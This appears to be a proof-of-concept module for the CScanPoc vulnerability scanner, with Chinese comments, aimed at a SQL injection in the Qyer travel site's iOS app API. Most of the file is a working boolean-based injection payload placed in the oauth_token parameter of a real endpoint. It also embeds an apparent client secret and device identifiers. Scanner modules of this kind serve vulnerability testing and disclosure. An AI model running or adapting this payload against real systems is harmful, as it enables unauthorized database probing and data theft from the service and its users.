# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Qyer_0101' # 平台漏洞编号
    name = '穷游网IOSAPP存在sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-18'  # 漏洞公布时间
    desc = '''
    穷游网IOSAPP存在sql注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=204828
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Qyer'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6ae3d6dd-c8e1-4711-9343-ac127922d46f' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-27' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/qyer/company/default_list?citys_str=52&client_id=qyer_ios&client_secret=cd254439208ab658ddf9&count=1&lat=1&lon=1&oauth_token=ab' AND '996'='996&page=1&track_app_channel=App%2520Store&track_app_version=6.8.5&track_device_info=iPhone8%2C1&track_deviceid=564443CC-9189-42C1-9CC9-0922116AD5C4&track_os=ios%25209.3.1&track_user_id=7851234&v=1"
            url1 = self.target + "/qyer/company/default_list?citys_str=52&client_id=qyer_ios&client_secret=cd254439208ab658ddf9&count=1&lat=1&lon=1&oauth_token=ab' AND '996'='997&page=1&track_app_channel=App%2520Store&track_app_version=6.8.5&track_device_info=iPhone8%2C1&track_deviceid=564443CC-9189-42C1-9CC9-0922116AD5C4&track_os=ios%25209.3.1&track_user_id=7851234&v=1"
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
